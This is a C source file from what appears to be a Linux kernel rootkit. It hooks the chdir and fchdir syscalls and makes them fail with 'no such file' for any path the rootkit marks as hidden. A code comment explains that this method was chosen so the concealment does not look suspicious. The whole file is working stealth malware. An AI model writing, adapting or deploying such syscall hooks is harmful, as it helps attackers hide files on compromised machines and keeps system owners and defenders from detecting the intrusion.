#include "../inc/hooks.h"
#include "../inc/util.h"

#include <linux/module.h>
#include <linux/namei.h>
#include <linux/path.h>

void *_chdir  = NULL;
void *_fchdir = NULL;

/*

 * instead of hooking 2 different syscalls, we can just hook set_fs_pwd
 * but that doesnt return anything so the calls would return success but directory would stay the same
 * which would be kinda SUS (insert amongus memes)

*/

asmlinkage int64_t h_chdir(const struct pt_regs *r) {
  const char __user *fn = (void *)r->di;
  struct path        fn_path;
  int64_t            ret = 0;

  hfind(_chdir, "__x64_sys_chdir");

  if (user_path_at(AT_FDCWD, fn, LOOKUP_FOLLOW, &fn_path) != 0) {
    debg("failed to get path struct");
    goto end;
  }

  if (should_hide_path(&fn_path))
    ret = -ENOENT;

end:
  if (ret == 0)
    hsyscall(_chdir);

  return ret;
}

asmlinkage int64_t h_fchdir(const struct pt_regs *r) {
  char       *_fd_path = NULL, *fd_path = NULL;
  uint32_t    fd = r->di;
  struct path fd_path_st;
  int64_t     ret = 0;

  hfind(_fchdir, "__x64_sys_fchdir");

  if (NULL == (_fd_path = fd_path = kmalloc(PATH_MAX + 1, GFP_KERNEL))) {
    debg("failed to allocate memory for the fd_path");
    goto end;
  }

  if (NULL == (fd_path = path_from_fd(fd, fd_path))) {
    debg("failed to obtain path from %u", fd);
    goto end;
  }

  if (kern_path(fd_path, LOOKUP_FOLLOW, &fd_path_st) != 0) {
    debg("failed to obtain path struct from %s", fd_path);
    goto end;
  }

  if (should_hide_path(&fd_path_st))
    ret = -ENOENT;

end:
  if (ret == 0)
    hsyscall(_fchdir);

  kfree(_fd_path);
  return ret;
}
